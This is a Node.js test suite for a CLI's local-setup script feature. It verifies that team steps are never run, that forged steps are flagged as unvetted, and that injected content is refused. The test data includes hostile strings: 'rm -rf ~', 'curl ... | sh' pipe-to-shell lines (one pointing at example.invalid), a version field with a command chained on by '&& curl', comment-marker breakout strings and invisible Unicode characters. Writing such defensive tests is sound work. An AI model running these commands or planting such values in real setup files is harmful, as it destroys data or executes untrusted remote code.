// E185 — the local setup script (`.sdlc/local-setup.json` + LOCAL-SETUP.md). The rules each test pins:
//   - setup and update write it on a Product, and on nothing else; an old project gets it on its next update;
//   - an update rewrites yad's steps and keeps the team's, byte for byte; a file that does not parse is never
//     rebuilt (it would delete the team's steps);
//   - the hash covers what a step runs, never its wording;
//   - yad runs only its own checks: a team's check is shown, never run;
//   - nothing in a step's words can end yad's block in LOCAL-SETUP.md early;
//   - the steps come from what the Product records, never from what one machine has.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

// The #280 guard (cli/test.mjs): printed lines go to stderr while the runner owns stdout.
if (process.env.NODE_TEST_CONTEXT) {
  const write = process.stdout.write;
  for (const k of ['log', 'info']) {
    const orig = console[k];
    console[k] = (...a) => (process.stdout.write === write ? console.error(...a) : orig(...a));
  }
}
process.env.YAD_NO_UPDATE_NOTIFIER = '1';
process.env.YAD_PLATFORM_LOGIN = '0';
process.env.YAD_PLATFORM_READ = '0';
process.env.YAD_CAPTURE = '0';

const { localSetupActions, localSetupDocLines, localSetupState, localSetupSection, readSteps, mergeLocalSetup, LOCAL_SETUP_MARKERS, runLocalSetupDone, runLocalSetupSkip } = await import('./local-setup.mjs');
const { localSetupRecordPath, readLocalSetupRecord } = await import('./local-setup-record.mjs');
const { yadflowSteps, stepHash, LOCAL_SETUP_FILE, LOCAL_SETUP_DOC } = await import('./local-setup-steps.mjs');
const { applyMarkedBlock } = await import('./marked-block.mjs');
const { VERSION } = await import('./manifest.mjs');

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const YAD = path.join(ROOT, 'bin/yad.mjs');
const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'yad-local-setup-')));
const put = (file, data) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, typeof data === 'string' ? data : JSON.stringify(data, null, 2)); };
const read = (file) => fs.readFileSync(file, 'utf8');
const applyAll = (actions) => { for (const a of actions) if (!a.writesNothing) a.apply(); };

// A Product folder: its config, and git so the committed copy can be read.
function product(config = { platform: 'none', ledger: 'local' }) {
  const dir = tmp();
  put(path.join(dir, '.sdlc/product.json'), config);
  execFileSync('git', ['init', '-q'], { cwd: dir });
  return dir;
}
const teamStep = (extra = {}) => ({
  id: 'docker', title: 'Install Docker', purpose: 'runs the API on your machine', impact: 'adds Docker Desktop',
  when: 'optional', commands: ['brew install --cask docker'], check: { run: 'docker --version' }, addedBy: 'Dev', ...extra,
});

test('setup and update write the script on a Product, as `new`; a folder with no Product gets nothing', () => {
  const dir = product();
  const actions = localSetupActions(dir);
  assert.deepEqual(actions.map((a) => [a.item, a.status]), [[LOCAL_SETUP_FILE, 'new'], [LOCAL_SETUP_DOC, 'new']]);
  // Shared files, like AGENTS.md: `--push` never stages them, `--open-pr` carries them.
  for (const a of actions) { assert.deepEqual(a.paths, []); assert.equal(a.shared, a.item); }
  applyAll(actions);
  const doc = JSON.parse(read(path.join(dir, LOCAL_SETUP_FILE)));
  assert.deepEqual(doc.team, []);
  assert.ok(doc.yadflow.some((s) => s.id === 'yadflow-cli'));
  assert.match(read(path.join(dir, LOCAL_SETUP_DOC)), /# Local setup/);
  // A second plan finds nothing to do.
  assert.deepEqual(localSetupActions(dir).map((a) => a.status), ['ok', 'ok']);

  assert.deepEqual(localSetupActions(tmp()), []);
});

test('an update rewrites yad\'s steps and keeps the team\'s steps and the team\'s text around the block', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  doc.yadflow[0].title = 'an old title';
  doc.teamNote = 'kept';
  put(file, doc);
  fs.appendFileSync(path.join(dir, LOCAL_SETUP_DOC), '\nOur own notes.\n');

  const actions = localSetupActions(dir);
  assert.deepEqual(actions.map((a) => a.status), ['outdated', 'outdated']);
  applyAll(actions);
  const after = JSON.parse(read(file));
  assert.deepEqual(after.team, [teamStep()]);
  assert.equal(after.teamNote, 'kept');
  assert.equal(after.yadflow[0].title, yadflowSteps(dir)[0].title);
  const text = read(path.join(dir, LOCAL_SETUP_DOC));
  assert.ok(text.endsWith('\nOur own notes.\n'));
  assert.match(text, /Install Docker/);
  assert.match(text, /added by your team \(Dev\), not vetted by yadflow/);
});

test('a script that does not parse, or whose team list is not a list, is left as it is', () => {
  for (const bad of ['{not json', JSON.stringify({ team: 'docker' }), JSON.stringify([1, 2])]) {
    const dir = product();
    put(path.join(dir, LOCAL_SETUP_FILE), bad);
    const actions = localSetupActions(dir);
    assert.equal(actions.length, 1, 'the view is not rebuilt from a file yad cannot read');
    assert.equal(actions[0].status, 'modified');
    assert.equal(actions[0].writesNothing, true);
    actions[0].apply();
    assert.equal(read(path.join(dir, LOCAL_SETUP_FILE)), bad);
  }
  assert.equal(mergeLocalSetup({ team: {} }, product()).unreadable, '`team` is not a list');
});

test('the hash covers what a step runs and how it is checked, never its words', () => {
  const s = teamStep();
  assert.equal(stepHash(s), stepHash({ ...s, title: 'Get Docker', purpose: 'other words', impact: 'other words' }));
  assert.notEqual(stepHash(s), stepHash({ ...s, commands: ['brew install docker'] }));
  assert.notEqual(stepHash(s), stepHash({ ...s, check: { run: 'docker info' } }));
  assert.notEqual(stepHash(s), stepHash({ ...s, when: 'required' }));
});

test('a step that is not sound is left out and named; a second one with the same id too', () => {
  const { steps, problems } = readSteps({
    yadflow: [{ ...teamStep({ id: 'x' }), check: { run: 'rm -rf ~' } }],
    team: [teamStep(), teamStep(), { id: 'Bad Id' }, teamStep({ id: 'no-commands', commands: [] })],
  });
  assert.deepEqual(steps.map((s) => s.id), ['docker']);
  assert.equal(problems.length, 4);
  assert.ok(problems.some((p) => /yadflow step `x` is ignored — its check is not one yad knows/.test(p)));
  assert.ok(problems.some((p) => /listed twice/.test(p)));
  assert.equal(readSteps({ team: 'x' }).problems.length, 1);
});

test('yad runs its own checks and never a team\'s: a team step is `ask`', () => {
  const dir = product();
  const marker = path.join(dir, 'ran');
  put(path.join(dir, LOCAL_SETUP_FILE), {
    yadflow: [{ id: 'yadflow-cli', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: '999.0.0' } }],
    team: [teamStep({ check: { run: `node -e "require('fs').writeFileSync('${marker.replace(/\\/g, '/')}', '')"` } })],
  });
  const st = localSetupState(dir, { items: [] });
  assert.equal(st.committed, false);
  // A yadflow step yad did not write is the person's to decide too: its check is the file's.
  assert.deepEqual(st.steps.map((s) => [s.id, s.state]), [['yadflow-cli', 'ask'], ['docker', 'ask']]);
  assert.equal(fs.existsSync(marker), false, 'a team check must never run');

  // yad's own steps are checked here: `ok` when done, `pending` when not (no hook in this new clone).
  const verified = product({ platform: 'github', ledger: 'verified' });
  applyAll(localSetupActions(verified));
  const by = Object.fromEntries(localSetupState(verified, { items: [] }).steps.map((s) => [s.id, s.state]));
  assert.equal(by['yadflow-cli'], 'ok');
  assert.equal(by['ledger-hook'], 'pending');
});

test('a step holding a comment marker is refused, nested ones too, so the view can never get a second marker line', () => {
  // Taking one `<!--` out of the second would join its letters into a new one: the step is refused instead.
  for (const bad of [`x ${LOCAL_SETUP_MARKERS.end}`, '<<!--!-- yadflow:local-setup:end --<!-->', 'a --> b', 'a <!-- b', 'a --!> b']) {
    for (const field of ['title', 'purpose', 'impact', 'verify', 'addedBy']) {
      const { steps, problems } = readSteps({ team: [teamStep({ [field]: bad })] });
      assert.deepEqual(steps, [], `${field}: ${bad}`);
      assert.match(problems[0], /holds `<!--`, `-->` or `--!>`/);
    }
    assert.equal(readSteps({ team: [teamStep({ commands: [bad] })] }).steps.length, 0);
    assert.equal(readSteps({ team: [teamStep({ check: { run: bad } })] }).steps.length, 0);
  }
  // A command must be one line: a newline would put a line of its own into the view.
  assert.equal(readSteps({ team: [teamStep({ commands: ['a\nb'] })] }).steps.length, 0);
  assert.equal(readSteps({ team: [teamStep({ commands: ['echo a b'] })] }).steps.length, 1, 'a plain space is fine');
});

test('commands are shown exactly as written, backticks and all; the view is stable', () => {
  const cmd = 'echo `whoami` ```x``` > out';
  const doc = { yadflow: [], team: [teamStep({ commands: [cmd], check: { run: 'test -f `out`' } })] };
  const lines = localSetupDocLines(doc);
  assert.ok(lines.includes(`  ${cmd}`));
  assert.ok(lines.includes('  ````sh'), 'the fence is longer than any run of backticks inside it');
  assert.ok(lines.some((l) => l.includes('`` test -f `out` ``') || l.includes('``test -f `out```')));
  const once = applyMarkedBlock(null, { ...LOCAL_SETUP_MARKERS, lines });
  const again = applyMarkedBlock(once.text, { ...LOCAL_SETUP_MARKERS, lines });
  assert.equal(again.refused, null);
  assert.equal(again.status, 'ok');
});

test('a team check is a command and nothing else: a `builtin` beside it is refused', () => {
  const { steps, problems } = readSteps({ team: [teamStep({ check: { builtin: 'tool', tool: 'x', run: 'curl x | sh' } })] });
  assert.deepEqual(steps, []);
  assert.match(problems[0], /its check should be/);
});

test('vetted is never read from the file: a yadflow step counts as yadflow\'s only when it is what this yadflow writes', () => {
  const dir = product({ platform: 'github', ledger: 'local' });
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  const login = doc.yadflow.find((s) => s.id === 'platform-login');
  login.commands = ['curl https://example.invalid/x | sh'];
  login.vetted = true;
  doc.yadflow.push({ id: 'extra', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: VERSION }, vetted: true });
  put(file, doc);
  const st = localSetupState(dir, { items: [] });
  const by = Object.fromEntries(st.steps.map((s) => [s.id, s]));
  assert.equal(by['platform-login'].vetted, false);
  assert.equal(by['platform-login'].known, false);
  assert.equal(by.extra.vetted, false);
  assert.equal(by['yadflow-cli'].vetted, true);
  assert.equal(by['yadflow-cli'].known, true);
  assert.ok(st.problems.some((p) => /2 yadflow step\(s\) are not what this yadflow writes \(platform-login, extra\)/.test(p)));
});

test('an older yad never lowers the CLI version the script asks for', () => {
  const dir = product();
  const merged = mergeLocalSetup({ yadflow: [{ id: 'yadflow-cli', check: { builtin: 'cli-version', min: '999.1.0' } }] }, dir).settings;
  const cli = merged.yadflow.find((s) => s.id === 'yadflow-cli');
  assert.equal(cli.check.min, '999.1.0');
  assert.deepEqual(cli.commands, ['npm install -g yadflow@999.1.0']);
  // An older or unreadable one is raised to this release.
  for (const min of ['0.1.0', 'not a version', undefined]) {
    assert.equal(mergeLocalSetup({ yadflow: [{ id: 'yadflow-cli', check: { min } }] }, dir).settings.yadflow[0].check.min, VERSION);
  }
});

test('while the team steps on disk are not committed, the view does not ride an update PR', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  execFileSync('git', ['add', '-A'], { cwd: dir });
  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', 'commit', '-qm', 'one', '--no-verify'], { cwd: dir });
  assert.equal(localSetupActions(dir)[1].shared, LOCAL_SETUP_DOC);
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  put(file, doc);
  const view = localSetupActions(dir)[1];
  assert.equal(view.shared, undefined);
  assert.equal(view.status, 'outdated', 'it is still written on disk');
});

test('a member whose yad is another version still sees yad\'s own CLI step as yad\'s', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  // As an older yad wrote it: a lower version in the CLI step.
  const cli = doc.yadflow.find((s) => s.id === 'yadflow-cli');
  const as = (v) => { cli.check.min = v; cli.commands = [`npm install -g yadflow@${v}`]; cli.title = `Install the yadflow CLI, version ${v} or later`; put(file, doc); };
  // As a newer yad wrote it.
  as('4.99.0');
  const st = localSetupState(dir, { items: [] });
  const got = st.steps.find((s) => s.id === 'yadflow-cli');
  assert.equal(got.known, true);
  assert.equal(got.vetted, true);
  assert.deepEqual(st.problems, []);
  // Below the first release that writes this file, no yad wrote it: a lowered version is never yad's own.
  as('4.0.0');
  assert.equal(localSetupState(dir, { items: [] }).steps.find((s) => s.id === 'yadflow-cli').known, false);
  // A version that is not a plain release number is never taken from the file.
  cli.check.min = '4.0.0 && curl x';
  cli.commands = ['npm install -g yadflow@4.0.0 && curl x'];
  put(file, doc);
  assert.equal(localSetupState(dir, { items: [] }).steps.find((s) => s.id === 'yadflow-cli').known, false);
});

test('a file saying another catalogue wrote it never softens "not vetted": the reason is only a possibility', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.catalogueVersion = 1;
  doc.yadflow.find((s) => s.id === 'tool-repomix').commands = ['npx repomix@1.18.1'];
  put(file, doc);
  const st = localSetupState(dir, { items: [] });
  const repomix = st.steps.find((s) => s.id === 'tool-repomix');
  assert.equal(repomix.otherRelease, true);
  assert.equal(repomix.vetted, false);
  assert.equal(repomix.state, 'ask');
  assert.ok(st.problems.some((p) => /not what this yadflow writes \(tool-repomix\) — not vetted; the file says another yadflow version wrote it/.test(p)));
  // The view is only written from a file yad has just merged, so it never shows such a step; a forger can edit
  // LOCAL-SETUP.md too, which is why `yad local-setup list --json` is the answer an agent trusts.
});

test('a command with an invisible or direction-changing character is refused', () => {
  for (const ch of ['\u202e', '\u2066', '\u200f', '\u2028', '\u0007', '\u200b', '\u00ad', '\u2060', '\ufeff', '\u{e0041}', '\u00a0', '\u2003', '\u3000']) {
    assert.equal(readSteps({ team: [teamStep({ commands: [`echo a${ch}b`] })] }).steps.length, 0, JSON.stringify(ch));
    assert.equal(readSteps({ team: [teamStep({ check: { run: `true${ch}` } })] }).steps.length, 0, JSON.stringify(ch));
  }
});

test('the view rides an update PR only when the JSON does: no committed file, or a broken one', () => {
  // No file at HEAD: an update PR commits yad's own JSON, with no team step.
  const dir = product();
  applyAll(localSetupActions(dir));
  assert.equal(localSetupActions(dir)[1].shared, LOCAL_SETUP_DOC);
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  put(file, doc);
  assert.equal(localSetupActions(dir)[1].shared, undefined, 'a team step that is not committed');
  // A broken file at HEAD: the JSON never rides, so neither does the view.
  const broken = product();
  put(path.join(broken, LOCAL_SETUP_FILE), '{broken');
  execFileSync('git', ['add', '-A'], { cwd: broken });
  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', 'commit', '-qm', 'one', '--no-verify'], { cwd: broken });
  put(path.join(broken, LOCAL_SETUP_FILE), '{}');
  assert.equal(localSetupActions(broken)[1].shared, undefined);
  // And the machine section says the committed file is broken.
  assert.equal(localSetupSection(broken).error, 'does not parse');
  assert.equal(localSetupSection(dir).error, null);
});

test('a team toolbox tool whose words yad\'s reader would refuse is left out when yad writes its step', () => {
  const dir = product();
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [{ id: 'ours', role: 'does a thing', fallback: 'nothing', detect: { bins: ['ours'] }, install: [{ type: 'script', command: 'echo <!-- x' }] }] });
  const ids = mergeLocalSetup({}, dir).settings.yadflow.map((s) => s.id);
  assert.ok(!ids.includes('tool-ours'), ids.join());
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [{ id: 'ours', role: 'does a thing', fallback: 'nothing', detect: { bins: ['ours'] }, install: [{ type: 'script', command: 'brew install ours' }] }] });
  const step = mergeLocalSetup({}, dir).settings.yadflow.find((s) => s.id === 'tool-ours');
  assert.deepEqual(step.commands, ['brew install ours']);
  assert.equal(step.vetted, false);
});

test('the machine section puts team steps and steps yad did not write on separate lines; only the second says not vetted', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  doc.yadflow.push({ id: 'extra', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: VERSION } });
  put(file, doc);
  const lines = [];
  // Both: lines go to stderr while a --json run is open (cli/lib.mjs `log`).
  const orig = { log: console.log, error: console.error };
  console.log = (...a) => lines.push(a.join(' '));
  console.error = (...a) => lines.push(a.join(' '));
  let res;
  try { res = localSetupSection(dir); } finally { Object.assign(console, orig); }
  const team = lines.find((l) => /from your team, to check with you: docker$/.test(l));
  const odd = lines.find((l) => /not what this yadflow writes — not vetted, to check with you: extra$/.test(l));
  assert.ok(team && !/not vetted/.test(team), lines.join('\n'));
  assert.ok(odd, lines.join('\n'));
  assert.deepEqual(res.unvetted, ['extra']);
  assert.ok(res.ask.includes('docker') && res.ask.includes('extra'));
  assert.equal(res.error, null);
});

test('a script with a byte-order mark is read; a broken one is said to exist, with its error', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  put(file, `\ufeff${read(file)}`);
  assert.equal(localSetupActions(dir)[0].writesNothing, undefined);
  assert.ok(localSetupState(dir, { items: [] }).steps.length > 0);
  put(file, '{broken');
  const st = localSetupState(dir, { items: [] });
  assert.equal(st.exists, true);
  assert.equal(st.error, 'does not parse');
  assert.equal(localSetupState(product(), { items: [] }).exists, false);
});

test('the steps come from what the Product records: platform, ledger and the team\'s tool choices', () => {
  const ids = (config, toolbox) => {
    const dir = product(config);
    if (toolbox) put(path.join(dir, '.sdlc/toolbox.json'), toolbox);
    return yadflowSteps(dir).map((s) => s.id);
  };
  const plain = ids({ platform: 'none', ledger: 'local' });
  assert.deepEqual(plain.filter((i) => !i.startsWith('tool-')), ['yadflow-cli']);
  assert.ok(plain.includes('tool-repomix'));
  assert.deepEqual(ids({ platform: 'github', ledger: 'local' }).slice(0, 2), ['yadflow-cli', 'platform-login']);
  const verified = ids({ platform: 'gitlab', ledger: 'verified' });
  assert.ok(verified.includes('ledger-hook') && verified.includes('commit-signing'));
  assert.ok(!ids({ platform: 'none' }, { shipped: { repomix: 'skip' } }).includes('tool-repomix'));
  // The CLI step names this release: each release's update asks each machine again.
  assert.equal(yadflowSteps(product())[0].commands[0], `npm install -g yadflow@${VERSION}`);
  // A shipped tool's step is its E165 recipe; a team's own tool keeps the team's install commands.
  assert.deepEqual(yadflowSteps(product()).find((s) => s.id === 'tool-repomix').commands, ['yad toolbox connect repomix --json']);
  // A person's step says so: the agent hands it over.
  assert.equal(yadflowSteps(product({ platform: 'github' })).find((s) => s.id === 'platform-login').person, true);
});

// ---- through the CLI ------------------------------------------------------------------------------------

function env(T) {
  const home = path.join(T, '.home');
  fs.mkdirSync(home, { recursive: true });
  const cfg = path.join(home, 'gitconfig');
  if (!fs.existsSync(cfg)) fs.writeFileSync(cfg, '[user]\n\tname = Dev\n\temail = dev@example.com\n[init]\n\tdefaultBranch = main\n[commit]\n\tgpgsign = false\n');
  const e = { ...process.env, HOME: home, USERPROFILE: home, GIT_CONFIG_GLOBAL: cfg, GIT_CONFIG_NOSYSTEM: '1', YAD_NO_UPDATE_NOTIFIER: '1', NO_COLOR: '1', YAD_CAPTURE: '0', YAD_PLATFORM_LOGIN: '0', YAD_PLATFORM_READ: '0', YAD_NO_REPORT: '1' };
  delete e.SDLC_NONINTERACTIVE;
  delete e.NODE_TEST_CONTEXT;
  return e;
}
const yad = (T, cwd, args) => {
  const r = spawnSync(process.execPath, [YAD, ...args], { cwd, env: env(T), encoding: 'utf8', timeout: 120_000 });
  let json = null;
  try { json = JSON.parse(r.stdout); } catch { /* not JSON */ }
  return { code: r.status, json, out: r.stdout, err: r.stderr };
};

test('yad new writes the script; an old project gets it back on its next update; list reads the committed copy', () => {
  const T = tmp();
  const made = yad(T, T, ['new', 'acme', '--json', '--solo', '--monorepo', '--no-tools', '--ide-targets', '.claude', '--platform', 'none', '--connect', 'none']);
  assert.equal(made.code, 0, made.err);
  const P = path.join(T, 'acme', 'product');
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_FILE)));
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_DOC)));

  // A project set up before E185: neither file.
  fs.rmSync(path.join(P, LOCAL_SETUP_FILE));
  fs.rmSync(path.join(P, LOCAL_SETUP_DOC));
  const up = yad(T, P, ['update', '--json']);
  assert.equal(up.code, 0, up.err);
  assert.ok(Array.isArray(up.json.localSetup.pending) && Array.isArray(up.json.localSetup.ask), 'update says what this machine still needs');
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_FILE)));
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_DOC)));

  const before = yad(T, P, ['local-setup', '--json']);
  assert.equal(before.code, 0, before.err);
  assert.equal(before.json.command, 'local-setup list');
  assert.equal(before.json.committed, false);
  execFileSync('git', ['add', '-A'], { cwd: P, env: env(T) });
  execFileSync('git', ['commit', '-qm', 'setup', '--no-verify'], { cwd: P, env: env(T) });
  const after = yad(T, P, ['local-setup', 'list', '--json']);
  assert.equal(after.json.committed, true);
  assert.equal(typeof after.json.pending, 'number');
  assert.equal(after.json.ask, 0);
  assert.ok(after.json.steps.find((s) => s.id === 'yadflow-cli').state === 'ok');
  assert.equal(yad(T, P, ['local-setup', 'nope']).code, 1);
  assert.equal(yad(T, T, ['local-setup']).code, 1, 'no Product here');
});

// ---- this machine's record (E185 part 2) ---------------------------------------------------------------

// A Product with its script written and committed, plus one team step, so the record has something of each kind.
// Its toolbox has a tool of the team's own that no machine has, so one step yad checks always fails.
const MISSING_TOOL = { id: 'nowhere', role: 'does a thing', fallback: 'nothing', detect: { bins: ['yad-e185-no-such-program'] }, install: [{ type: 'script', command: 'brew install nowhere' }] };
function committedProduct(config, team = [teamStep()]) {
  const dir = product(config);
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [MISSING_TOOL] });
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  put(file, { ...JSON.parse(read(file)), team });
  const g = (...a) => execFileSync('git', a, { cwd: dir, env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' } });
  g('add', '-A');
  g('-c', 'user.name=Dev', '-c', 'user.email=dev@example.com', '-c', 'commit.gpgsign=false', 'commit', '-qm', 'setup', '--no-verify');
  return dir;
}
const quiet = (fn) => {
  const saved = [console.log, console.error, process.exitCode];
  const lines = [];
  console.log = (...a) => lines.push(a.join(' '));
  console.error = (...a) => lines.push(a.join(' '));
  try { return { value: fn(), lines, code: process.exitCode }; } finally { [console.log, console.error] = saved; process.exitCode = saved[2]; }
};
const stateOf = (dir, id, opts) => localSetupState(dir, opts).steps.find((s) => s.id === id);

test('the record lives in git\'s own folder, so it is never committed, and every worktree of the clone shares it', () => {
  const dir = committedProduct();
  const file = localSetupRecordPath(dir);
  assert.equal(file, path.join(fs.realpathSync(path.join(dir, '.git')), 'yad', 'local-setup-done.json'));
  quiet(() => runLocalSetupDone(dir, { ids: ['docker'] }));
  assert.ok(fs.existsSync(file));
  assert.equal(execFileSync('git', ['status', '--porcelain'], { cwd: dir, encoding: 'utf8' }), '', 'nothing in the repo changed');
  const wt = path.join(tmp(), 'wt');
  execFileSync('git', ['worktree', 'add', '-q', '--detach', wt], { cwd: dir });
  assert.equal(localSetupRecordPath(wt), file);
  assert.equal(stateOf(wt, 'docker').state, 'done');
});

test('done records a team step; a step yad can check is refused while its check fails, and nothing is written', () => {
  const dir = committedProduct();
  assert.equal(stateOf(dir, 'docker').state, 'ask');
  const r = quiet(() => runLocalSetupDone(dir, { ids: ['docker'] }));
  assert.deepEqual(r.value.done, ['docker']);
  const docker = stateOf(dir, 'docker');
  assert.equal(docker.state, 'done');
  assert.ok(docker.seen && docker.recorded && !docker.changed);

  // A tool step yad checks, and the tool is not here: its check fails.
  const pending = stateOf(dir, 'tool-nowhere');
  assert.equal(pending.state, 'pending', 'a tool that is not installed here');
  const before = read(localSetupRecordPath(dir));
  const refused = quiet(() => runLocalSetupDone(dir, { ids: ['docker', pending.id] }));
  assert.equal(refused.code, 1);
  assert.equal(read(localSetupRecordPath(dir)), before, 'every id passes or nothing is written');
  assert.equal(quiet(() => runLocalSetupDone(dir, { ids: ['nope'] })).code, 1, 'an id that is not a step');
  assert.equal(quiet(() => runLocalSetupDone(dir, { ids: [] })).code, 1);
});

test('skip needs a reason, holds until the step changes, and done and skip replace each other', () => {
  const dir = committedProduct();
  assert.equal(quiet(() => runLocalSetupSkip(dir, { ids: ['docker'] })).code, 1, 'no reason');
  assert.equal(quiet(() => runLocalSetupSkip(dir, { ids: ['docker'], reason: '   ' })).code, 1);
  assert.equal(quiet(() => runLocalSetupSkip(dir, { ids: ['docker', 'yadflow-cli'], reason: 'x' })).code, 1, 'one id');
  assert.equal(quiet(() => runLocalSetupSkip(dir, { ids: ['docker'], reason: 'a\u001b[2Jb' })).code, 1, 'one plain line');
  quiet(() => runLocalSetupSkip(dir, { ids: ['docker'], reason: 'I run the API  in the cloud' }));
  let docker = stateOf(dir, 'docker');
  assert.equal(docker.state, 'skipped');
  assert.equal(docker.reason, 'I run the API in the cloud');
  const section = quiet(() => localSetupSection(dir)).value;
  assert.deepEqual(section.skipped, ['docker']);
  assert.ok(!section.ask.includes('docker') && !section.pending.includes('docker'));

  // A skipped step yad checks still needs its check to pass before `done`.
  const pending = stateOf(dir, 'tool-nowhere');
  quiet(() => runLocalSetupSkip(dir, { ids: [pending.id], reason: 'not for me' }));
  assert.equal(stateOf(dir, pending.id).state, 'skipped', 'a no wins over a check');
  assert.equal(quiet(() => runLocalSetupDone(dir, { ids: [pending.id] })).code, 1);

  quiet(() => runLocalSetupDone(dir, { ids: ['docker'] }));
  assert.equal(stateOf(dir, 'docker').state, 'done');

  // The team changes what the step runs: the old answer no longer counts.
  const file = path.join(dir, LOCAL_SETUP_FILE);
  put(file, { ...JSON.parse(read(file)), team: [teamStep({ commands: ['brew install --cask docker@4'] })] });
  execFileSync('git', ['-c', 'user.name=Dev', '-c', 'user.email=dev@example.com', '-c', 'commit.gpgsign=false', 'commit', '-qam', 'docker 4', '--no-verify'], { cwd: dir });
  docker = stateOf(dir, 'docker');
  assert.equal(docker.state, 'ask');
  assert.ok(docker.changed && !docker.recorded && !docker.seen);
  assert.deepEqual(quiet(() => localSetupSection(dir)).value.changed, ['docker']);
  // Its wording alone changes nothing (the hash covers what a step runs).
  quiet(() => runLocalSetupDone(dir, { ids: ['docker'] }));
  put(file, { ...JSON.parse(read(file)), team: [teamStep({ commands: ['brew install --cask docker@4'], purpose: 'runs the API and the queue' })] });
  execFileSync('git', ['-c', 'user.name=Dev', '-c', 'user.email=dev@example.com', '-c', 'commit.gpgsign=false', 'commit', '-qam', 'words', '--no-verify'], { cwd: dir });
  assert.equal(stateOf(dir, 'docker').state, 'done');
});

test('a record that does not parse reads as empty, with a warning, and is never overwritten', () => {
  const dir = committedProduct();
  const file = localSetupRecordPath(dir);
  put(file, '{ not json');
  const rec = readLocalSetupRecord(dir);
  assert.deepEqual(rec.entries, {});
  assert.equal(rec.error, 'does not parse');
  assert.equal(stateOf(dir, 'docker').state, 'ask');
  const r = quiet(() => runLocalSetupDone(dir, { ids: ['docker'] }));
  assert.equal(r.code, 1);
  assert.equal(read(file), '{ not json');
  assert.ok(quiet(() => localSetupSection(dir)).lines.some((l) => /read as empty/.test(l)));
  // An entry of the wrong shape is left out; the others count.
  const hash = stateOf(dir, 'docker').hash;
  put(file, { steps: { docker: { hash, state: 'done' }, other: { hash: 1, state: 'done' }, x: 'no' } });
  assert.deepEqual(Object.keys(readLocalSetupRecord(dir).entries), ['docker']);
  // A write keeps every other entry and key.
  put(file, { note: 'mine', steps: { gone: { hash: 'h', state: 'done', at: 't' } } });
  quiet(() => runLocalSetupSkip(dir, { ids: ['docker'], reason: 'no' }));
  const doc = JSON.parse(read(file));
  assert.equal(doc.note, 'mine');
  assert.ok(doc.steps.gone && doc.steps.docker.state === 'skipped');
  assert.equal(doc.schemaVersion, undefined, 'not a .sdlc file: no shape stamp');
});

test('yad guide and doctor run no check that starts a program: the login step is judged by the record', () => {
  const dir = committedProduct({ platform: 'github', ledger: 'local', git_url: 'https://github.com/o/r.git' });
  const login = stateOf(dir, 'platform-login', { noProgram: true });
  assert.equal(login.state, 'ask');
  assert.match(login.why, /not checked here/);
  // `done` runs the step's real check: here a gh that says it is not signed in, so nothing is recorded.
  if (process.platform !== 'win32') {
    const bin = path.join(tmp(), 'bin');
    put(path.join(bin, 'gh'), '#!/bin/sh\nexit 1\n');
    fs.chmodSync(path.join(bin, 'gh'), 0o755);
    const PATH = process.env.PATH;
    process.env.PATH = `${bin}${path.delimiter}${PATH}`;
    try {
      const r = quiet(() => runLocalSetupDone(dir, { ids: ['platform-login'] }));
      assert.equal(r.code, 1);
      assert.equal(stateOf(dir, 'platform-login', { noProgram: true }).state, 'ask');
      // `skip` needs no check: it starts no gh at all.
      put(path.join(bin, 'gh'), `#!/bin/sh\necho ran >> '${path.join(bin, 'ran')}'\nexit 1\n`);
      quiet(() => runLocalSetupSkip(dir, { ids: ['platform-login'], reason: 'I use the web' }));
      assert.ok(!fs.existsSync(path.join(bin, 'ran')), 'skip started gh');
      assert.equal(stateOf(dir, 'platform-login', { noProgram: true }).state, 'skipped');
    } finally { process.env.PATH = PATH; }
  }
  assert.equal(stateOf(dir, 'yadflow-cli', { noProgram: true }).state, 'ok', 'a check that starts nothing still runs');
});

test('doctor names the steps waiting on this machine, and a record it cannot read; nothing with no script', async () => {
  const { localSetupChecks } = await import('./doctor.mjs');
  const rows = (dir) => { const checks = []; localSetupChecks(checks, dir); return checks; };
  assert.deepEqual(rows(product()), [], 'no script: nothing to say');
  const dir = committedProduct();
  let [row] = rows(dir);
